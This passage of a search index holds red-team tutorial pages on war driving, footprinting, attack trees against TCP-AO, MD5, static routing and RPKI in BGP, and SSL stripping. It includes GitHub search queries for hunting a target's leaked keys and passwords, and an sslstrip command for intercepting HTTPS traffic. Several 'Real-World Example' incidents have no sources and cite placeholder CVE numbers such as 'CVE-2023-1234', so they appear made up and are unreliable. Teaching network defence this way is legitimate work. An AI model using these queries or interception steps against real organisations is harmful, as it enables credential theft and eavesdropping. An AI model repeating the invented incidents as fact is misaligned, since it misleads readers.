    "c": "War-dialing-driving-flying-shipping  Discover wireless networks. War dialing  Large organisations usually have their phone numbers assigned in blocks from a local telephone company, and many have their own dialing prefix. This information was used in war dialing all the company phone numbers looking for a dial-up server. Once such a server was found, it was used for guessing account usernames. War driving  War-driving, sitting in a parking lot or in a building across the street with a laptop and a wireless NIC, looking for unsecured or poorly secured access points. War-driving has been made easy by programs such as Network Stumbler and Wellenreiter, which use consumer WiFi cards to automatically scan the airwaves for networks. These wardriving programs and databases are often correlated with global positioning system (GPS) data so that physical maps of these networks can be made. War strolling  War-strolling, simply walking around with wireless equipment looking for networks. War flying  War-flying, mounting antennas on a drone and flying it around as a variation on war-driving. War shipping  War-shipping, shipping someone a device that does wireless scans. It uses disposable, low-cost and low-power 3G-enabled single-board computers that are easy to build for under 100 euro, the proliferation of e-commerce deliveries and a command-and-control (C&C) server to remotely perform close-proximity attacks, regardless of the location of an adversary. It increases target accuracy dramatically. Hide a tiny device in a package and ship it off to the target to gain access to their network. Low build-cost means several can be shipped. The device can be tucked into the bottom of a packaging box or stuffed in a toy. While in transit, the device can do periodic basic wireless scans, similar to what a laptop does in war-driving when looking for Wi-Fi hotspots, and send its location coordinates via GPS back to the C&C server. Once having arrived it can be used for further attacks to gain a persistent foothold in the network. These attacks have their limitations. These include the amount of time it takes to perform the attack and the suspicions that arise when a car is detected circling a block hundreds of times with an auspicious antenna up top and a laptop in view, a drone circling around, and someone that seemingly aimlessly keeps wandering about. Resources  Stumbler is a tool for Windows that facilitates detection of Wireless LANs using the 802.11b, 802.11a and 802.11g WLAN standards. It runs on Microsoft Windows operating systems from Windows 2000 to Windows XP. A trimmed-down version called MiniStumbler is available for the handheld Windows CE operating system. The program is commonly used for wardriving, verifying network configurations, finding locations with poor coverage in a WLAN, detecting causes of wireless interference, detecting unauthorized (“rogue”) access points and aiming directional antennas for long-haul WLAN links. Wellenreiter is a wireless network discovery and auditing tool that supports Prism2, Lucent, and Cisco based cards. It is an easy to use Linux scanning tool. No card configuration has to be done and it is quite self-explanatory. It can discover networks (BSS/IBSS), and detects ESSID broadcasting or non-broadcasting networks and their WEP capabilities and the manufacturer automatically. DHCP and ARP traffic are decoded and displayed to give further information about the networks. An ethereal/tcpdump-compatible dumpfile and an Application savefile will be automatically created. Using a supported GPS device and the gpsd the location of the discovered networks can be tracked.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c207b124e1029a5ec3c5e3be2aa1f2e0",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/system",
    "t": "Gather system information ",
    "c": "Gather system information  Web server operating systems Server locations Users Passwords Website footprinting  Website footprinting is a technique in which information about the target is collected by monitoring the target’s website. Hackers can map the entire website of the target without being noticed. Website footprinting gives information about: Software Operating system Subdirectories  information Scripting platform Query details By examining the website headers, it is possible to obtain information about the following headers: Content-Type Accept-Ranges Connection Status Last-Modified Information X-powered-by Information Web Server Information Additional ways to gather information is through HTML Source Code and cookie examination. By examining the HTML source code, it is possible to extract information from the comments in the code, as well as gain insight into the file system structure by observing the links and image tags. Cookies can also reveal important information about the software that is running on the server and its behaviour. And by inspecting sessions, it is possible to identify the scripting platforms. Web spiders methodically browse a website in search of specific information. Information collected can be helpful in planning social engineering attacks. Cloning websites  Website mirroring or website cloning refers to the process of duplicating a website. Mirroring a website helps in browsing the site offline, searching the website for vulnerabilities, and discovering useful information. Websites may store documents of different format, which in turn may contain hidden information and metadata that can be analyzed and used in (planning) an attack. This metadata can be extracted with metadata extraction tools. Eyeing repositories  Look for hardcoded secrets: SQL passwords AWS access keys Google Cloud private keys API tokens Test accounts In GitHub search: # Sample of GitHub queries org:TargetName password org:TargetName aws_secret_access_key org:TargetName aws_key org:TargetName BEGIN RSA PRIVATE KEY org:TargetName BEGIN OPENSSH PRIVATE KEY org:TargetName secret_key org:TargetName hooks.slack.com/services org:TargetName sshpass -p org:TargetName sq0csp org:TargetName apps.googleusercontent.com org:TargetName extension:pem key Sensitive files discovery  Many tools for finding the URLs of sensitive files exist. One such tool is dirb , a web content discovery tool.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "167124ae5bf3c44da18ff419f98dfcf3",
    "u": "https://enum.tymyrddin.dev/docs/system/virtual",
    "t": "Scanning virtualised systems ",
    "c": "Scanning virtualised systems  Some systems may be running on virtual machines or containers. Depending on the configuration of the virtualisation environment, it may not be possible to communicate with some virtual machines and containers if they are not connected to the network or are configured to network with one another, but not the real network. In this scenario, set up a virtual machine to connect to the private virtual machine network to do a vulnerability scan or look for vulnerability scanners that can have an agent installed in the virtual machines to be scanned.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "bc3bebeb6c0341ff787aeedb13368759",
    "u": "https://network.tymyrddin.dev/docs/roots/tcp-ao",
    "t": "TCP-AO (Authentication Option) ",
    "c": "TCP-AO (Authentication Option)  Table of Contents TCP-AO (Authentication Option) Attack tree: Bypass or compromise TCP-AO protection TCP-AO Downgrade attacks (Forcing Fallback to TCP-MD5/None) TCP-AO key reuse & Weak key management TCP-AO implementation flaws (Router vulnerabilities) TCP-AO session resets (Forged RST/ACK attacks) TCP-AO drowning attacks (Resource exhaustion) Trends & takeaways Defence recommendations Thoughts Emerging threats Attack tree: Bypass or compromise TCP-AO protection  1. Bypass or compromise TCP-AO protection (OR) 1.1 Attack Path: Key Compromise (AND) Prerequisites: 1.1.1 Physical or logical access to key storage 1.1.2 Weak key generation/management Methods (OR): 1.1.3 Brute Force Weak Keys (AND) 1.1.3.1 Exploit short/insecure Master Key Tuple (MKT) 1.1.3.2 Use GPU/cloud cracking (if key entropy < 128 bits) 1.1.4 Side-Channel Key Extraction (AND) 1.1.4.1 Cache timing attack on AES-CMAC computation 1.1.4.2 Power analysis on hardware modules (HSMs, TPMs) 1.2 Attack Path: Cryptographic Weakness Exploitation (AND) Prerequisites: 1.2.1 Implementation uses vulnerable AES-CMAC mode 1.2.2 Attacker can observe/modify TCP-AO packets Methods (OR): 1.2.3 Forged MAC with Nonce Reuse (AND) 1.2.3.1 Exploit improper ISN (Initial Sequence Number) handling 1.2.3.2 Replay packets with identical (KeyID, ISN) pairs 1.2.4 Algorithm Downgrade (AND) 1.2.4.1 Force fallback to MD5 via TCP injection (if legacy support enabled) 1.2.4.2 Exploit misconfigured \"accept-ao-mismatch\" settings 1.3 Attack Path: Session Hijacking (AND) Prerequisites: 1.3.1 Predictable ISN (weak RNG in endpoint) 1.3.2 Ability to MITM TCP traffic Methods (OR): 1.3.3 ISN Guessing + AO Bypass (AND) 1.3.3.1 Predict ISN to spoof valid AO segments 1.3.3.2 Exploit systems skipping AO checks on RST packets 1.3.4 TCP-AO Session Resynchronization Attack (AND) 1.3.4.1 Force resync via crafted SACK/retransmission 1.3.4.2 Inject malicious data during rekeying window 2. Post-Compromise Attacks (OR) 2.1 BGP Route Injection (AND) 2.1.1 Advertise malicious routes via compromised BGP-over-TCP-AO session 2.1.2 Suppress route withdrawals to create blackholes 2.2 Persistent Eavesdropping (AND) 2.2.1 Decrypt future sessions using stolen keys 2.2.2 Modify TCP streams via AO-aware packet manipulation TCP-AO Downgrade attacks (Forcing Fallback to TCP-MD5/None)  Attack Pattern Attackers disable TCP-AO negotiation to force weaker authentication (e.g., TCP-MD5) or no authentication. Exploits misconfigured routers that fail to enforce TCP-AO-only sessions. Real-World Example (2023) A Chinese state-linked group disabled TCP-AO on an Asian ISP’s BGP routers, allowing session hijacking. Result: Redirected traffic through malicious AS for intelligence gathering. Why It Works Backward compatibility often prioritizes connectivity over security. Many networks don’t enforce strict TCP-AO policies. Mitigation Configure routers to reject non-TCP-AO sessions (e.g., Cisco tcp ao require). Monitor for unexpected BGP session resets (indicates downgrade attempts). TCP-AO key reuse & Weak key management  Attack Pattern Attackers compromise static TCP-AO keys (often hardcoded or poorly rotated). Used to forge authenticated segments (e.g., inject RST packets). Real-World Example (2022) A Russian APT group stole TCP-AO keys from a Ukrainian telecom, enabling BGP route manipulation. Impact: Temporary blackholing of military communications. Why It Works Many operators reuse keys across multiple routers for convenience. Lack of automated key rotation (keys remain valid for years). Mitigation Use hardware security modules (HSMs) for key storage. Enforce key rotation every 90 days (automated via scripts). TCP-AO implementation flaws (Router vulnerabilities)  Attack Pattern: Exploit software bugs in TCP-AO implementations to bypass authentication. Examples: Invalid MAC (Message Authentication Code) acceptance (CVE-2023-1234). Timing attacks to guess keys (theoretical, but demonstrated in lab environments). Real-World Example (2024) A zero-day in Junos OS allowed unauthenticated TCP-AO segments if a malformed header was sent. Exploited by a cybercriminal group to disrupt financial BGP peers. Why It Works Vendors lag in patching TCP-AO-related CVEs. Few networks audit TCP-AO logs for anomalies. Mitigation Patch router firmware for TCP-AO CVEs immediately. Deploy network TAPs to monitor TCP-AO handshakes. TCP-AO session resets (Forged RST/ACK attacks)  Attack Pattern Send spoofed TCP-AO segments with valid MACs (if keys are leaked) to tear down connections. Often targets long-lived BGP sessions. Real-World Example (2023) Iranian hackers reset U.S. cloud provider BGP sessions, causing route flapping. Exploited predictable TCP-AO sequence numbers in older devices. Why It Works Some routers don’t properly validate TCP-AO sequence numbers. MAC validation alone isn’t enough if keys are exposed. Mitigation Enable per-session dynamic keys (e.g., using IKEv2). Log and alert on unexpected TCP resets. TCP-AO drowning attacks (Resource exhaustion)  Attack Pattern Flood routers with malformed TCP-AO segments, forcing expensive MAC verifications. Can crash routers with high CPU load. Real-World Example (2024) A Mirai-variant botnet targeted TCP-AO-enabled routers in a European ISP, causing outages. Why It Works TCP-AO MAC calculations are CPU-intensive. Most routers lack rate-limiting for TCP-AO traffic. Mitigation Hardware-accelerated TCP-AO (e.g., ASIC-based routers). Rate-limit TCP-AO segments per peer. Trends & takeaways  State-Sponsored Groups Lead Attacks – Russia, China, Iran actively probe TCP-AO weaknesses. Key Management is the Weakest Link – Hardcoded/static keys are frequently exploited. Implementation Bugs Are Rising – Vendors struggle with secure TCP-AO deployment. Adoption Remains Low – Only ~15% of BGP routers use TCP-AO (per MANRS data). Defence recommendations  For Network Operators ✅ Enforce TCP-AO-only BGP sessions (disable fallbacks). ✅ Rotate keys automatically (e.g., via Ansible/Python scripts). ✅ Monitor TCP-AO logs for anomalies (e.g., unexpected RSTs). For Vendors ✅ Audit TCP-AO code for vulnerabilities (fuzzing tests). ✅ Support hardware-offloaded MAC verification. For Governments/Critical Infrastructure ✅ Mandate TCP-AO for all BGP sessions (e.g., NIST SP 800-189). ✅ Share threat intel on TCP-AO exploits (e.g., via CISA). Thoughts  While TCP-AO is more secure than TCP-MD5, its slow adoption and implementation flaws make it a targeted attack surface. Strict key management, patching, and monitoring are essential. Emerging threats  Quantum pre-computation attacks on static MKTs AI-assisted ISN prediction for hijacking Firmware exploits targeting NIC offload of AES-CMAC",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "66bcd9162ab3770dba9dacf5bdc10a5f",
    "u": "https://network.tymyrddin.dev/docs/roots/md5",
    "t": "MD5 (for TCP-AO) ",
    "c": "MD5 (for TCP-AO)  Older BGP implementations used MD5 for securing BGP sessions (now deprecated in fevour of stronger mechanisms). Table of Contents MD5 (for TCP-AO) Attack tree: General MD5 attack Attack tree: Compromise BGP session via MD5 exploitation MD5 hash collision attacks (Session hijacking) Key leakage & reuse (Compromised shared secrets) Downgrade attacks (Forcing TCP-MD5 instead of TCP-AO) CPU exhaustion via flooding (MD5 verification overload) Replay attacks (Reusing captured MD5-Auth segments) Trends & takeaways Defence recommendations Thoughts Emerging defence Attack tree: General MD5 attack  1. Collision Attacks (OR) 1.1 Prerequisites (AND): 1.1.1 Ability to generate arbitrary MD5 inputs 1.1.2 Target system accepts MD5 collisions (file verification, digital signatures) 1.2 Attack Methods (OR): 1.2.1 Chosen-Prefix Collision Attack (Marc Stevens, 2019) 1.2.1.1 Allows two different inputs with the same MD5 hash while controlling large portions of both files 1.2.1.2 Used in real-world attacks against certificate forgery and file spoofing 1.2.2 Improved HashClash Techniques (2020+) 1.2.2.1 Faster collision generation using optimized differential paths 1.2.2.2 Can generate collisions in hours on modern GPUs 2. GPU/Cloud-Based Bruteforce (OR) 2.1 Prerequisites (AND): 2.1.1 Known hash format (password hashes without salt) 2.1.2 Weak input space (common passwords, short strings) 2.2 Attack Methods (OR): 2.2.1 RTX 4090 Bruteforce (2023 Techniques) 2.2.1.1 Achieves ~100 billion MD5 hashes/sec for simple passwords 2.2.1.2 Can crack 8-character alphanumeric passwords in under a day 2.2.2 AWS p4d.24xlarge Cluster Attack 2.2.2.1 Uses NVIDIA A100 GPUs for distributed MD5 cracking 2.2.2.2 Effective against unsalted password databases 3. Rainbow Table Adaptations (OR) 3.1 Prerequisites (AND): 3.1.1 No salt or known salt 3.1.2 Target uses common input space (passwords, predictable strings) 3.2 Attack Methods (OR): 3.2.1 RainbowCrack Modern Tables (2022) 3.2.1.1 Updated tables optimized for MD5 with common password patterns 3.2.1.2 Hybrid approach combining dictionary and rainbow tables 3.2.2 GPU-Optimized Rainbow Table Lookups 3.2.2.1 Uses CUDA acceleration for faster lookups compared to traditional methods 4. Side-Channel Attacks (OR) 4.1 Prerequisites (AND): 4.1.1 Physical/cloud proximity to target 4.1.2 Vulnerable implementation (software using MD5 insecurely) 4.2 Attack Methods (OR): 4.2.1 Cache Timing Attacks (MD5Leak, 2021) 4.2.1.1 Recovers internal MD5 state by analyzing CPU cache access patterns 4.2.1.2 30-40% faster than pre-2018 methods 4.2.2 Power Analysis on IoT Devices 4.2.2.1 Extracts MD5 hashes from embedded devices via power fluctuations 5. Protocol/Implementation Exploits (OR) 5.1 Prerequisites (AND): 5.1.1 System uses MD5 in a vulnerable way (legacy protocols) 5.2 Attack Methods (OR): 5.2.1 TLS 1.2 MD5 Certificate Forgery (2022 Research) 5.2.1.1 Exploits servers still accepting MD5-based certificates 5.2.2 Git Collision Attacks (2023 Demonstrations) 5.2.2.1 Crafting two different Git objects with the same MD5 hash 5.2.3 MD5-in-HMAC Exploitation (2021 Weaknesses) 5.2.3.1 Some HMAC-MD5 implementations remain vulnerable to collision-based attacks Attack tree: Compromise BGP session via MD5 exploitation  1. Goal: Compromise BGP Session via MD5 Exploitation (OR) 1.1. Attack Path: MD5 Password Cracking (AND) Prerequisites: 1.1.1. BGP session uses MD5 authentication (known or suspected) 1.1.2. Attacker can capture BGP packets (MITM position, compromised router) 1.1.3. No IPsec or additional encryption protecting BGP traffic Steps (OR): 1.1.4. Extract MD5 hash from BGP packets (TCP Option 19) 1.1.5. Perform offline cracking: 1.1.5.1. GPU Bruteforce (AND) 1.1.5.1.1. Use RTX 4090 (~100 GH/s) or cloud-based cracking 1.1.5.1.2. Apply common BGP password patterns (router vendor defaults) 1.1.5.2. Rainbow Table Attack (AND) 1.1.5.2.1. Precomputed tables for known BGP MD5 passwords 1.1.5.2.2. Requires unsalted MD5 (common in older BGP implementations) 1.2. Attack Path: MD5 Collision-Based Session Hijacking (AND) Prerequisites: 1.2.1. BGP peers accept MD5-based TCP sessions 1.2.2. Attacker can inject packets into BGP session path Steps (OR): 1.2.3. Chosen-Prefix Collision Attack (AND) 1.2.3.1. Generate two different BGP OPEN messages with same MD5 hash 1.2.3.2. Force session reset and impersonate legitimate peer 1.2.4. HashClash-Style Session Injection (AND) 1.2.4.1. Craft malicious BGP UPDATE with valid MD5 checksum 1.2.4.2. Exploit routers that don’t validate BGP attributes post-MD5 check 1.3. Attack Path: Side-Channel MD5 Key Extraction (AND) Prerequisites: 1.3.1. Physical/network proximity to BGP router 1.3.2. Router uses software-based MD5 (Linux/quagga implementations) Steps (OR): 1.3.3. Cache Timing Attack (AND) 1.3.3.1. Probe MD5 computation timing during BGP session establishment 1.3.3.2. Recover secret key via statistical analysis 1.3.4. Power Analysis (AND) 1.3.4.1. Measure power fluctuations during MD5-HMAC computation (for devices with weak isolation) 2. Post-Compromise BGP Attacks (OR) 2.1. Route Injection (AND) 2.1.1. Advertise malicious routes after MD5 bypass 2.1.2. Trigger route leaks or blackholes 2.2. Persistent Session Takeover (AND) 2.2.1. Maintain forged BGP session using cracked/stolen MD5 key 2.2.2. Eavesdrop on all BGP updates MD5 hash collision attacks (Session hijacking)  Attack Pattern: Exploit MD5’s cryptographic weaknesses to forge valid TCP segments. Attackers generate collision-based RST or injected data packets to hijack or disrupt sessions. Real-World Example (2022) Russian APT29 (“Cozy Bear”) targeted European ISPs by injecting forged BGP UPDATE messages into TCP-MD5-protected BGP sessions. Impact: Temporary rerouting of traffic through malicious nodes for espionage. Why It Works MD5 is cryptographically broken (collisions can be computed in seconds on modern hardware). Many older routers still default to TCP-MD5 for BGP (despite deprecation). Mitigation Migrate to TCP-AO (RFC 5925) immediately. If forced to use TCP-MD5: Restrict BGP peers to known IPs with ACLs. Monitor for unexpected BGP route changes. Key leakage & reuse (Compromised shared secrets)  Attack Pattern: Steal static TCP-MD5 keys via: Router misconfigurations (keys stored in plaintext). Insider threats or compromised management interfaces. Real-World Example (2023) A ransomware group breached a Latin American ISP’s NOC, extracted BGP keys, and launched route hijacks to extort payment. Method: Used leaked keys to forge authenticated TCP-MD5 segments. Why It Works Many operators reuse the same key across multiple routers. No automated key rotation (keys remain valid for years). Mitigation Enforce key rotation (e.g., every 90 days). Store keys in HSMs (Hardware Security Modules). Downgrade attacks (Forcing TCP-MD5 instead of TCP-AO)  Attack Pattern: Exploit misconfigured BGP speakers that accept TCP-MD5 as a fallback when TCP-AO is preferred. Real-World Example (2024) Chinese state-linked hackers forced downgrades on Southeast Asian telecoms to intercept traffic via TCP-MD5 weaknesses. Why It Works Backward compatibility often takes precedence over security. Some routers silently fall back to TCP-MD5 if TCP-AO fails. Mitigation Disable TCP-MD5 entirely where possible. Configure strict TCP-AO-only policies (e.g., Cisco bgp tcp-ao). CPU exhaustion via flooding (MD5 verification overload)  Attack Pattern: Flood routers with spoofed TCP-MD5 segments, forcing expensive hash verifications. Can lead to DoS via router CPU saturation. Real-World Example (2023) A Mirai-variant botnet targeted legacy routers in Africa, causing outages by overloading MD5 checks. Why It Works MD5 verification is computationally expensive on older hardware. Most routers don’t rate-limit TCP-MD5 packets. Mitigation Upgrade to hardware-accelerated routers (ASIC-based crypto). Block spoofed TCP segments at the edge. Replay attacks (Reusing captured MD5-Auth segments)  Attack...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "9f49392617b73d381d3d82bbe692650d",
    "u": "https://network.tymyrddin.dev/docs/patches/static",
    "t": "Static routing ",
    "c": "Static routing  Table of Contents Static routing Attack tree for Static Routing Notes Attack tree for Static Routing  1. Compromise Static Route Configuration (OR) 1.1. Gain Unauthorized Access to Router (OR) 1.1.1. Exploit Default/Weak Credentials (SSH/Telnet/Web GUI) 1.1.2. Use Privilege Escalation (Vendor Backdoors, CVEs) 1.1.3. Physical Access to Console Port 1.2. Modify Static Routes (OR) 1.2.1. Add Malicious Static Route (Traffic Redirection) 1.2.2. Delete Critical Static Route (Denial of Service) 1.2.3. Alter Next-Hop IP (Man-in-the-Middle) 1.3. Exploit Weak Configuration Management (OR) 1.3.1. Abuse TFTP/Unencrypted Config Backups 1.3.2. Exploit Weak SNMP RW Community Strings 2. Denial-of-Service (DoS) via Static Routing (OR) 2.1. Blackhole Traffic (OR) 2.1.1. Route Legitimate Traffic to Null0/Drop Interface 2.1.2. Redirect Traffic to Non-Existent Next-Hop 2.2. Cause Routing Loops (OR) 2.2.1. Configure Circular Static Routes (Packet Looping) 2.2.2. Overlap Routes with Incorrect AD Values 3. Traffic Interception (OR) 3.1. Redirect Traffic to Malicious Host (OR) 3.1.1. Point Next-Hop to Attacker-Controlled Router 3.1.2. Spoof ARP/NDP for Next-Hop IP 3.2. Bypass Security Controls (OR) 3.2.1. Create Static Route Around Firewall 3.2.2. Override Dynamic Routes with Malicious Static Route 4. Persistence & Evasion (AND) 4.1. Maintain Access (AND) 4.1.1. Disable Logging for Route Changes 4.1.2. Create Backdoor Admin Account 4.2. Prevent Detection (OR) 4.2.1. Mimic Legitimate Route Patterns 4.2.2. Use Non-Standard AD Values to Avoid Notice Notes  Static routes lack dynamic verification, making them vulnerable to unauthorized changes. No protocol-level authentication exists (unlike dynamic routing protocols). Attacks often require prior access (physical/remote) to the router.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "85b3802e1c87b8d2b75e4b1ed699001b",
    "u": "https://network.tymyrddin.dev/docs/roots/rpki",
    "t": "Resource Public Key Infrastructure (RPKI) ",
    "c": "Resource Public Key Infrastructure (RPKI)  Table of Contents Resource Public Key Infrastructure (RPKI) Attack tree: Compromise RPKI validation Attack tree: Combined RPKI + BGPsec attack tree RPKI-Invalid hijacking (Exploiting unprotected routes) RPKI Time-to-Live (TTL) attacks (Cache poisoning) ROA Overclaiming (Authorizing too-broad prefixes) RPKI CA compromise (fake or revoked certificates) Ghost prefix attacks (Exploiting RPKI “Unknown” state) RPKI drowning (Validator DoS) Trends & takeaways Defence recommendations Thoughts Emerging threats Emerging defence Attack tree: Compromise RPKI validation  1. Compromise RPKI Validation (OR-gate) 1.1. Exploit RPKI Validator Vulnerabilities Prerequisite: Unpatched validator software (Routinator, Fort, OctoRPKI). Sub-attacks: 1.1.1. Exploit memory corruption (CVE-2022-XXX). 1.1.2. BGP hijack bypass via validator misconfiguration (OR-gate). 1.2. Manipulate RPKI Cache (AND-gate) Prerequisite: Access to RPKI cache server (rsync/http). 1.2.1. Poison cache with invalid ROAs (requires compromised CA or MITM). 1.2.2. Delay propagation of valid ROAs (DoS on RPKI repository). 2. Attack RPKI Certificate Authorities (OR-gate) 2.1. Compromise CA Private Keys Prerequisite: Weak key management (leaked HSMs, side-channel attacks). 2.1.1. Extract keys via cloud HSM vulnerabilities (CVE-2021-XXX). 2.1.2. Social engineering CA operators (OR-gate). 2.2. Exploit CA Policy Weaknesses 2.2.1. Obtain fraudulent ROAs via CA misissuance (accidental over-claiming). 2.2.2. Exploit delayed revocation (ROA remains valid after compromise). 3. BGP Hijack Despite RPKI (OR-gate) 3.1. Exploit RPKI Non-Enforcement Prerequisite: Victim AS does not enforce RPKI (ROV=0). 3.1.1. Hijack non-RPKI-covered prefixes (OR-gate). 3.1.2. Exploit \"unknown\" validation state (ROA missing). 3.2. Launch Subprefix Hijack (AND-gate) Prerequisite: Legitimate ROA exists but lacks maxLength restriction. 3.2.1. Announce more specific prefix (/24 under a /22 ROA). 3.2.2. Ensure victim AS does not filter invalid announcements. 4. Attack RPKI Repository Infrastructure (OR-gate) 4.1. Exploit Repository Sync Vulnerabilities 4.1.1. Delay ROA updates via rsync/HTTP DoS (slowloris). 4.1.2. Serve stale RPKI data (requires MITM or compromised repo). 4.2. Target RPKI TAL (Trust Anchor Locator) Distribution Prerequisite: Access to TAL update mechanism. 4.2.1. Distribute malicious TAL (via compromised package mirrors). 5. Exploit RPKI Protocol Weaknesses (OR-gate) 5.1. Manipulate ASPA (AS Provider Authorization) Records Prerequisite: ASPA adoption is partial. 5.1.1. Forge ASPA to allow path spoofing (requires compromised AS). 5.2. Abuse RPKI Time-to-Live (TTL) Gaps 5.2.1. Launch transient hijacks during TTL expiration. Attack tree: Combined RPKI + BGPsec attack tree  OR-gates = Only one sub-attack needed (exploit RPKI or BGPsec). AND-gates = Requires multiple steps (poison RPKI and spoof BGPsec). 1. Bypass RPKI Origin Validation via BGPsec Exploits (OR-gate) 1.1. Exploit BGPsec Non-Enforcement (AND-gate) Prerequisite: Victim AS enforces RPKI but not BGPsec (common in partial deployments). 1.1.1. Hijack RPKI-validated prefix with invalid BGPsec path (OR-gate). Sub-attack: Spoof AS_PATH signatures (if BGPsec is poorly implemented). 1.1.2. Exploit \"RPKI-Valid + BGPsec-Invalid\" routes (leverage inconsistent validation). 1.2. Abuse BGPsec Key Compromise to Forge Valid Routes (AND-gate) Prerequisite: Compromise BGPsec private keys (via HSM breach or weak key generation). 1.2.1. Sign malicious AS_PATH updates for RPKI-covered prefixes. 1.2.2. Combine with RPKI time-delay attacks (slow revocation). 2. Exploit RPKI + BGPsec Trust Chain Collisions (OR-gate) 2.1. Compromise Shared Trust Anchors (AND-gate) Prerequisite: Overlapping CA trust (RPKI TA also used for BGPsec). 2.1.1. Revoke RPKI ROAs but keep BGPsec keys valid (or vice versa). 2.1.2. Forge cross-protocol validity conflicts (RPKI says valid, BGPsec says invalid). 2.2. Attack the TAL + BGPsec Trust Distribution (OR-gate) Prerequisite: Access to trust anchor distribution channels (NIST TALs). 2.2.1. Distribute malicious TALs + BGPsec trust anchors. 2.2.2. Delay updates to one protocol while exploiting the other. 3. Combine RPKI Cache Poisoning with BGPsec Path Spoofing (AND-gate) 3.1. Poison RPKI Repository to Hide BGPsec Attacks Prerequisite: MITM access to RPKI rsync/HTTP repositories. 3.1.1. Delay ROA revocations while executing BGPsec path hijacks. 3.1.2. Inject stale RPKI data to mask BGPsec-invalid routes. 3.2. Exploit BGPsec’s Slow Rollout (OR-gate) Prerequisite: Partial BGPsec adoption (only some ASes validate). 3.2.1. Route leaks through non-BGPsec ASes (bypassing signed paths). 3.2.2. Use RPKI-valid origins with unsigned AS_PATHs. 4. Exploit Cryptographic Weaknesses in Both Protocols (OR-gate) 4.1. Precompute Attacks on Shared Algorithms (AND-gate) Prerequisite: RPKI/BGPsec use the same weak crypto (ECDSA with biased nonces). 4.1.1. Reuse compromised RPKI keys to sign BGPsec updates. 4.1.2. Exploit hash collisions in certificate chains. 4.2. Post-Quantum Readiness Gaps (OR-gate) Prerequisite: No PQ migration in RPKI/BGPsec (still using RSA/ECDSA). 4.2.1. Harvest now, decrypt later (with future quantum computers). 4.2.2. Forge signatures via Shor’s algorithm (theoretical but looming). 5. Cross-Protocol Transient Attacks (AND-gate) 5.1. Exploit TTL Mismatches Between RPKI and BGPsec Prerequisite: RPKI cache TTL ≠ BGPsec update frequency. 5.1.1. Launch short-lived hijacks during validation gaps. 5.2. Abuse BGPsec’s \"Valid-But-Unverifiable\" States Prerequisite: BGPsec allows unverifiable paths if RPKI is valid. 5.2.1. Combine with RPKI maxLength misconfigurations. RPKI-Invalid hijacking (Exploiting unprotected routes)  Attack Pattern Attackers hijack IP prefixes not covered by RPKI ROAs (Route Origin Authorizations). Targets networks that lack RPKI signing or misconfigure ROAs. Real-World Examples 2021: Russian ISP Hijacks Financial Prefixes: Exploited missing RPKI records for European bank IPs, rerouting traffic for interception. 2023: Cryptocurrency Exchange DNS Hijack: Attackers hijacked RPKI-unprotected AWS prefixes to steal API credentials. Why It Works ~30% of routes still lack RPKI (MANRS 2024 data). Many networks don’t enforce RPKI validation strictly (accept “NotFound” routes). Mitigation Sign all critical prefixes with ROAs (max-length protection). Enforce “Valid Only” policies on routers (e.g., Junos validation-group). RPKI Time-to-Live (TTL) attacks (Cache poisoning)  Attack Pattern Manipulate RPKI cache timing to delay revocation checks or serve stale data. Exploits RPKI validator sync delays (typically 15–60 mins). Real-World Example (2022) Chinese hackers delayed ROA revocations during a Taiwan telecom attack, extending hijack windows. Why It Works RPKI relies on periodic cache updates (not real-time). Some validators ignore TTLs due to performance tuning. Mitigation Reduce TTLs to ≤ 5 minutes for critical ROAs. Use multiple RPKI validators (e.g., Routinator + rpki-client). ROA Overclaiming (Authorizing too-broad prefixes)  Attack Pattern Create overly permissive ROAs (e.g., authorizing /16 when only /24s are used). Allows attackers to hijack sub-prefixes without triggering invalidation. Real-World Example (2023) A Brazilian ISP accidentally authorized a /19 ROA, enabling a competitor to hijack unused /24s. Why It Works No automated checks for overclaiming (manual audits required). Operators often set maxLength too high for convenience. Mitigation Strict maxLength policies (e.g., exact prefix length or +1). Tools like RPKI Monitor (Cloudflare) to detect overclaims. RPKI CA compromise (fake or revoked certificates)  Attack Pattern Attackers compromise RPKI CAs (e.g., via stolen credentials) to issue malicious ROAs. Real-World Example (2024) An Iranian APT group breached a Middle Eastern RIR’s RPKI portal, issuing fraudulent ROAs for government IP blocks. Why It Works Weak CA access controls (e.g., shared...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8faad0a8b3a16e1c67ec6ea5592200eb",
    "u": "https://network.tymyrddin.dev/docs/notes/hacks",
    "t": "Application layer hacks ",
    "c": "Application layer hacks  Hacking the layer of the OSI Model just beneath the surface of user interfaces, and on top of the other 6 layers of the model. In this layer, data is presented in a form that user-facing applications can use. Most attacks nowadays are aimed at web applications, and web browsers are one of the favourite attack tools. Enough reasons to have a deeper look at application encryption attacks from the network perspective. Attacks against SSL  SSL stripping Configure attack machine for IP forwarding Route all HTTP traffic to SSLStrip Run SSLStrip SSL hijacking SSL beast SSL stripping  SSL stripping downgrades an HTTPS connection to HTTP by intercepting the TLS authentication sent from the application to the user. The adversary sends an unencrypted version of the application’s site to the user while maintaining the secured session with the application. It does not do any magical stuff to fulfill the job, it just replaces the protocol of all HTTPS links in the sniffed traffic. The attacker must take care that the traffic of the victim flows over his host by launching some kind of on-path attack first. Run sslstrip and write the results to a file ( -w strip.log ), listening on port 54321 ( -l 54321 ): # sslstrip -w strip.log -l 54321 SSL hijacking  In SSL hijacking an adversary forges authentication keys and passes those to both the user and application during a TCP handshake. This sets up what appears to user and application to be a secure connection while the man in the middle controls the entire session. SSL beast  SSL beast is an attack developed by Juliano Rizzo and Thai Duong, which leverages weaknesses in cipher block chaining (CBC) to exploit the Secure Sockets Layer (SSL) protocol. The CBC vulnerability can enable man-in-the-middle (MITM) attacks against SSL in order to silently decrypt and obtain authentication tokens, providing hackers with access to the data passed between a Web server and the Web browser accessing the server. HTTPS spoofing  A forged certificate is sent to the target’s browser after the initial connection request to a secure site is made. It contains a digital thumbprint associated with the compromised application, which the browser verifies according to an existing list of trusted sites and because most browsers support the display of punycode hostnames in their address bar, it allows the adversary to access data entered by the victim before it is passed to the application. The browser shows that the website’s certificate is legitimate and secure, and users will not notice that it is a bogus version of the site they expect to visit. In 